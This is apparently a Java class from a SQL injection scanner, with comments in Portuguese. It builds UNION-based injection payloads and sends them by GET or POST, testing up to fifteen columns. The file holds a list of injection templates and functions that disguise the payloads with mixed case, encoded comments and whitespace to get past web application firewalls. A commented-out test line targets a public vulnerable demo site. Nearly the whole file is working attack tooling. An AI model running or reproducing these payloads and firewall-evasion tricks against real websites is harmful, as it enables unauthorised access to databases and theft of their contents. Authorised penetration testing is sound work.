/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package MontaUrls;

public class UnionBased {

    private final int nColunas = 15;
    private final String payload = "0x54434350656e74657374";

    private final String UnionStyles[]
            = {"321' UNION ALL SELECT [t]#",
                "321 UNION ALL SELECT [t]",
                "321 UNION ALL SELECT [t] AND '0'='0",
                "321 UNION ALL SELECT [t]--",
                "321 UNION ALL SELECT [t] AND '0'='0--",
                "321\" UNION ALL SELECT [t] AND '0'='0",
                "321) UNION ALL SELECT [t] AND (0=0",
                "321 UNION ALL SELECT [t] #",
                "321' UNION ALL SELECT [t] AND '0'='0 #"};

    public UnionBased(String url) {
        if (url.contains("!_!")) {
            this.urlPOST = url;
            System.out.println("Enviando POST ->" + url);
            new Thread(UnionIntegerPOST).start();
        } else {
            this.urlGET = url;
            System.out.println("Enviando GET ->" + url);
            new Thread(UnionIntegerGET).start();
        }
    }

    public UnionBased() {
    }
    private String urlGET;
    private String urlPOST;

    private String replaceBypassLowerUpper(String url, int metodo) {
        String bypass = "";
        String unionMethod1 = "uNiOn", selectMethod1 = "sElEcT", allMethod1 = "aLl",
               unionMethod2 = "UnIoN", selectMethod2 = "SeLeCt", allMethod2 = "AlL";
        if (metodo == 1) {
            bypass = url.replace("UNION", unionMethod1).replace("ALL", allMethod1).replace("SELECT", selectMethod1);
        } else {
            bypass = url.replace("UNION", unionMethod2).replace("ALL", allMethod2).replace("SELECT", selectMethod2);
        }
        return bypass;
    }

    private String replaceBypassWAF(String url, int metodo) {
        String bypass = "";
        String  unionMethod1 = "%2f**%2fuNiOn%2f**%2faLl", selectMethod1 = "%2f**%2fsElEcT",
                unionMethod2 = "%2fuNiOn%2faLl",           selectMethod2 = "%2fsElEcT",
                unionMethod3 = "/%2A%2A/uNiOn/%2A%2A/aLl", selectMethod3 = "/%2A%2A/sElEcT",
                unionMethod4 = "%0buNiOn%0baLl",           selectMethod4 = "%0bsElEcT",
                unionMethod5 = "unio%0bn all",             selectMethod5 = "sel%0bect";
        if (metodo == 1) {
            bypass = url.replace("UNION+ALL", unionMethod1).replace("SELECT", selectMethod1);
        } else if (metodo == 2){
            bypass = url.replace("UNION+ALL", unionMethod2).replace("SELECT", selectMethod2);
        } else if (metodo == 3) {
            bypass = url.replace("UNION+ALL", unionMethod3).replace("SELECT", selectMethod3);
        } else if (metodo == 4){
            bypass = url.replace("UNION+ALL", unionMethod4).replace("SELECT", selectMethod4);
        }else if (metodo == 5){
            bypass = url.replace("UNION+ALL", unionMethod5).replace("SELECT", selectMethod5);
        }
        return bypass;
    }

//    public static void main(String[] args) {
//        System.out.println(replaceBypassWAF("http://testphp.vulnweb.com/listproducts.php?cat=2321+UNION+ALL+SELECT+0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374,0x54434350656e74657374+#", 3));
//    }
    private Runnable UnionIntegerGET = new Runnable() {
        @Override
        public void run() {
            System.out.println(urlGET);
            String recebeUrl = null;
            String unionTemporario = null;

            for (String UnionStyle : UnionStyles) {
                String codHexadecimal = payload;
                for (int i = 0; i < nColunas; i++) {
                    try {
                        recebeUrl = urlGET;
                        if (recebeUrl.contains("!-!")) {
                            if (i < 1) {
                                unionTemporario = UnionStyle.replaceAll(" ", "+").replace("[t]", codHexadecimal);
                            } else {
                                codHexadecimal += "," + payload;
                                unionTemporario = UnionStyle.replaceAll(" ", "+").replace("[t]", codHexadecimal);
                            }
                        }
                        ExecutaTestes.GET.enviaGet(replaceBypassLowerUpper(recebeUrl.replaceAll("!-!", unionTemporario), 2));
                        //ExecutaTestes.GET.enviaGet(recebeUrl.replaceAll("!-!", unionTemporario));
                    } catch (Exception e) {
                    }
                }
            }
        }
    };
    private Runnable UnionIntegerPOST = new Runnable() {
        @Override
        public void run() {
            String recebeUrl = null;
            String unionTemporario = null;
            String urlTempo = urlPOST;
            String urlPost[] = urlTempo.split("!_!");
            for (String styles : UnionStyles) {
                String codHexadecimal = payload;
                for (int i = 0; i < nColunas; i++) {
                    try {
                        recebeUrl = urlPost[1];
                        if (recebeUrl.contains("!-!")) {
                            if (i < 1) {
                                unionTemporario = styles.replace("[t]", codHexadecimal);
                            } else {
                                codHexadecimal += "," + payload;
                                unionTemporario = styles.replace("[t]", codHexadecimal);
                            }
                        }
                        ExecutaTestes.POST.Start(urlPost[0], recebeUrl.replaceAll("!-!", unionTemporario));
                        //ExecutaTestes.POST.Start(urlPost[0], recebeUrl.replaceAll("!-!", unionTemporario));
                    } catch (Exception e) {
                    }
                }
            }
        }
    };
}
